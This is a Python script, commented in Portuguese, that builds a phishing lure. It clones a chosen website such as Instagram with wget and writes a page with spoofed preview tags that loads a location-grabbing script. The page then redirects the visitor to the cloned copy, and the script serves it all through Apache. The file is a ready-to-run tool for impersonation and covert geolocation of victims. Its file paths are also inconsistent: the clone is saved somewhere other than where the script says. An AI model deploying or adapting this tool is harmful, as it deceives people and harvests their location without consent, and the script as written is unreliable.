#!/usr/bin/env python3

import os
import subprocess
import shutil
import socket
from pathlib import Path

# Cores para impressão no terminal
R = '\033[31m'  # Red
G = '\033[32m'  # Green
C = '\033[36m'  # Cyan
W = '\033[0m'   # White

# Função para obter o IP privado
def get_private_ip():
    try:
        # Cria um socket temporário para obter o IP privado
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(0)
        # Conecta a um endereço público, mas não envia dados
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f'[ERROR] Não foi possível obter o IP privado: {e}')
        return '127.0.0.1'

# Função para clonar o site usando wget
def clone_website(url, user_home_path):
    print(f'[INFO] Clonando o site {url} com wget...')
    # Comando para clonar o site
    clone_command = f'wget --no-check-certificate --mirror --convert-links --adjust-extension --page-requisites --no-parent {url} -P /var/www/html/index2.html'

    try:
        subprocess.call(clone_command, shell=True)
        print(f'[INFO] Site clonado com sucesso. O arquivo clonado está em {user_home_path}/seeker/template/custom_og_tags/index2.html')
    except Exception as e:
        print(f'[ERROR] Erro ao clonar o site: {e}')

    return os.path.join(user_home_path, 'seeker/template/custom_og_tags/index2.html')

# Função para criar o index.html inicial
def create_initial_index(redirect_url, sitename, user_home_path):
    print(f'[INFO] Criando o arquivo inicial index.html...')
    title = os.getenv('TITLE', 'Default Title')
    imageUrl = os.getenv('IMAGE', 'https://example.com/default.jpg')
    desc = os.getenv("DESC", 'Default description')

    # Definindo o conteúdo do index.html inicial
    initial_html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="{title}">
    <meta property="og:site_name" content="{sitename}">
    <meta property="og:description" content="{desc}">
    <meta property="og:image" content="{imageUrl}">
    <title>{title}</title>
    <script type="text/javascript">
        if (window.location.protocol == "http:") {{
            var restOfUrl = window.location.href.substr(5);
            window.location = "https:" + restOfUrl;
        }}
    </script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script type="text/javascript" src="js/location.js"></script>
</head>
<body onload="information();locate(function(){{window.location='{redirect_url}/index2.html';}}, function(){{$('#change').html('Failed');}});">
</body>
</html>
"""

    # Salvando o index.html no diretório apropriado
    index_path = os.path.join(user_home_path, 'seeker/template/custom_og_tags/index.html')
    with open(index_path, 'w') as index_file:
        index_file.write(initial_html_content)

    print(f'[INFO] Arquivo inicial index.html gerado com sucesso em {index_path}')

    # Copiar o index.html gerado para index_temp.html
    index_temp_path = os.path.join(user_home_path, 'seeker/template/custom_og_tags/index_temp.html')
    shutil.copy(index_path, index_temp_path)
    print(f'[INFO] Arquivo index.html copiado para index_temp.html em {index_temp_path}')

    return index_path

# Função para copiar arquivos para o diretório do Apache
def copy_to_apache(user_home_path):
    apache_dir = '/var/www/html'
    source_dir = os.path.join(user_home_path, 'seeker/template/custom_og_tags/')

    print(f'[INFO] Copiando arquivos de {source_dir} para {apache_dir}...')

    try:
        # Copiar todos os arquivos gerados para /var/www/html
        for filename in os.listdir(source_dir):
            source_file = os.path.join(source_dir, filename)
            dest_file = os.path.join(apache_dir, filename)
            shutil.copy(source_file, dest_file)
            print(f'[INFO] Arquivo {source_file} copiado com sucesso para {dest_file}')
    except Exception as e:
        print(f'[ERROR] Erro ao copiar os arquivos: {e}')

# Função para iniciar o Apache2
def start_apache():
    print(f'[INFO] Verificando status do Apache2...')

    # Usar o comando 'service' para iniciar o Apache2
    try:
        subprocess.call(['sudo', 'service', 'apache2', 'start'])
        print(f'[INFO] Apache2 iniciado com sucesso!')
    except Exception as e:
        print(f'[ERROR] Falha ao iniciar o Apache2: {e}')

# Fluxo principal
def main():
    print(f'[INFO] Script iniciado, coletando entradas do usuário...')

    # Obter o caminho do diretório home do usuário
    user_home_path = str(Path.home())

    # Input para o caminho ou URL do HTML
    url = input("[INFO] Digite a URL para clonar: ")
    port = input("[INFO] Digite a porta em que vai hospedar o HTML: ")

    # Obter o IP privado
    private_ip = get_private_ip()
    redirect_url = f"http://{private_ip}:{port}"
    print(f'[INFO] URL de redirecionamento definida como {redirect_url}')

    # O nome do site pode ser extraído diretamente da URL
    sitename = url.split('.')[0]  # Usar o nome do domínio como sitename (ex: www.instagram.com -> instagram)

    # Clonar o site e gerar o index2.html
    clone_website(url, user_home_path)

    # Criar o index.html inicial com a função de redirecionamento
    create_initial_index(redirect_url, sitename, user_home_path)

    # Copiar os arquivos para o diretório do Apache
    copy_to_apache(user_home_path)

    # Iniciar o Apache2
    start_apache()

    print(f'[INFO] O site está hospedado e disponível em {redirect_url}')

if __name__ == "__main__":
    main()
